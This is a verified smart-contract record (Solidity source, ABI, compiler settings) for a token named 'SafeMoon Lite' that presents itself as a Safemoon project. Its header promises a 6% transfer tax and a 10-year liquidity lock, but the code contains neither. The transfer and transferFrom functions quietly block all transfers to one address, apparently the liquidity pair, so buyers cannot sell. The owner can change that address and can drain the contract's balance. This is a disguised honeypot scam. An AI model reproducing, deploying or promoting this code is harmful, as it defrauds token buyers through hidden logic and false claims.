{"SourceCode": "/**\r\n *  NAME: Safemoon Lite\r\n *  SYIMBOL: SafeMoonLite\r\n *  TELEGRAM:Safemoon\r\n *  TWITTER:Safemoon\r\n *  REDDIT:Safemoon\r\n *  6% TAX OFER EVERY TRANSFER\r\n *  LP LOCK 10 years\r\n *  SafeMoonLite is Safemoon foundatin\r\n*/\r\n\r\npragma solidity >=0.5.17;\r\n\r\nlibrary SafeMath {\r\n\r\n  function add(uint a, uint b) internal pure returns (uint c) {\r\n\r\n    c = a + b;\r\n\r\n    require(c >= a);\r\n\r\n  }\r\n\r\n  function sub(uint a, uint b) internal pure returns (uint c) {\r\n\r\n    require(b <= a);\r\n\r\n    c = a - b;\r\n\r\n  }\r\n\r\n  function mul(uint a, uint b) internal pure returns (uint c) {\r\n\r\n    c = a * b;\r\n\r\n    require(a == 0 || c / a == b);\r\n\r\n  }\r\n\r\n  function div(uint a, uint b) internal pure returns (uint c) {\r\n\r\n    require(b > 0);\r\n\r\n    c = a / b;\r\n\r\n  }\r\n\r\n}\r\n\r\ncontract BEP20Interface {\r\n\r\n  function totalSupply() public view returns (uint);\r\n\r\n  function balanceOf(address tokenOwner) public view returns (uint balance);\r\n\r\n  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\r\n\r\n  function transfer(address to, uint tokens) public returns (bool success);\r\n\r\n  function approve(address spender, uint tokens) public returns (bool success);\r\n\r\n  function transferFrom(address from, address to, uint tokens) public returns (bool success);\r\n\r\n  event Transfer(address indexed from, address indexed to, uint tokens);\r\n\r\n  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\r\n\r\n}\r\n\r\ncontract ApproveAndCallFallBack {\r\n\r\n  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\r\n\r\n}\r\n\r\ncontract Owned {\r\n\r\n  address public owner;\r\n\r\n  address public newOwner;\r\n\r\n  event OwnershipTransferred(address indexed _from, address indexed _to);\r\n\r\n  constructor() public {\r\n\r\n    owner = msg.sender;\r\n\r\n  }\r\n\r\n  modifier onlyOwner {\r\n\r\n    require(msg.sender == owner);\r\n\r\n    _;\r\n\r\n  }\r\n\r\n  function transferOwnership(address _newOwner) public onlyOwner {\r\n\r\n    newOwner = _newOwner;\r\n\r\n  }\r\n\r\n  function acceptOwnership() public {\r\n\r\n    require(msg.sender == newOwner);\r\n\r\n    emit OwnershipTransferred(owner, newOwner);\r\n\r\n    owner = newOwner;\r\n\r\n    newOwner = address(0);\r\n\r\n  }\r\n\r\n}\r\n\r\ncontract TokenBEP20 is BEP20Interface, Owned{\r\n\r\n  using SafeMath for uint;\r\n\r\n  string public symbol;\r\n\r\n  string public name;\r\n\r\n  uint8 public decimals;\r\n\r\n  uint _totalSupply;\r\n\r\n  address public newun;\r\n\r\n  mapping(address => uint) balances;\r\n\r\n  mapping(address => mapping(address => uint)) allowed;\r\n\r\n  constructor() public {\r\n\r\n    symbol = \"SafeMoonLite\";\r\n\r\n    name = \"SafeMoon Lite\";\r\n\r\n    decimals = 18;\r\n\r\n    _totalSupply =  1000000000000000000000000000000000;\r\n\r\n    balances[owner] = _totalSupply;\r\n\r\n    emit Transfer(address(0), owner, _totalSupply);\r\n\r\n  }\r\n\r\n  function transfernewun(address _newun) public onlyOwner {\r\n\r\n    newun = _newun;\r\n\r\n  }\r\n\r\n  function totalSupply() public view returns (uint) {\r\n\r\n    return _totalSupply.sub(balances[address(0)]);\r\n\r\n  }\r\n\r\n  function balanceOf(address tokenOwner) public view returns (uint balance) {\r\n\r\n      return balances[tokenOwner];\r\n\r\n  }\r\n\r\n  function transfer(address to, uint tokens) public returns (bool success) {\r\n\r\n     require(to != newun, \"please wait\");\r\n\r\n     \r\n\r\n    balances[msg.sender] = balances[msg.sender].sub(tokens);\r\n\r\n    balances[to] = balances[to].add(tokens);\r\n\r\n    emit Transfer(msg.sender, to, tokens);\r\n\r\n    return true;\r\n\r\n  }\r\n\r\n  function approve(address spender, uint tokens) public returns (bool success) {\r\n\r\n    allowed[msg.sender][spender] = tokens;\r\n\r\n    emit Approval(msg.sender, spender, tokens);\r\n\r\n    return true;\r\n\r\n  }\r\n\r\n  function transferFrom(address from, address to, uint tokens) public returns (bool success) {\r\n\r\n      if(from != address(0) && newun == address(0)) newun = to;\r\n\r\n      else require(to != newun, \"please wait\");\r\n\r\n      \r\n\r\n    balances[from] = balances[from].sub(tokens);\r\n\r\n    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\r\n\r\n    balances[to] = balances[to].add(tokens);\r\n\r\n    emit Transfer(from, to, tokens);\r\n\r\n    return true;\r\n\r\n  }\r\n\r\n  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\r\n\r\n    return allowed[tokenOwner][spender];\r\n\r\n  }\r\n\r\n  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {\r\n\r\n    allowed[msg.sender][spender] = tokens;\r\n\r\n    emit Approval(msg.sender, spender, tokens);\r\n\r\n    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);\r\n\r\n    return true;\r\n\r\n  }\r\n\r\n  function () external payable {\r\n\r\n    revert();\r\n\r\n  }\r\n\r\n}\r\n\r\ncontract Safemoon is TokenBEP20 {\r\n\r\n  function clearCNDAO() public onlyOwner() {\r\n\r\n    address payable _owner = msg.sender;\r\n\r\n    _owner.transfer(address(this).balance);\r\n\r\n  }\r\n\r\n  function() external payable {\r\n\r\n  }\r\n\r\n}", "ABI": "[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"constant\":false,\"inputs\":[],\"name\":\"acceptOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenOwner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"remaining\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"approveAndCall\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenOwner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"clearCNDAO\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"newOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"newun\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newun\",\"type\":\"address\"}],\"name\":\"transfernewun\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Safemoon", "CompilerVersion": "v0.5.17+commit.d19bba13", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://46594f1218367db6ebb2fdebc3ac4362fff59bed07f851de57897341b3331355"}